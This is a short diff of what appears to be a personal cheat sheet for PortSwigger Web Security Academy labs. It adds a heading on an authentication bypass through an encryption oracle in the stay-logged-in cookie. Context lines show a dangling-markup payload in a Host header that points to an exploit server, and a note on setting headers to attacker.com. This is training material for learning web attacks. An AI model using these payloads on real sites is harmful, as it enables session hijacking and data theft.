@@ -56,4 +56,8 @@ Try to use same emails, but use a little different symbols, that can be converte
 Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?
 ```
 
+# Stay-logged-in + Notification cookie (using comments)
+
+https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle
+
 # The Host, Referrer, and Origin headers are simultaneously changed to attacker.com.
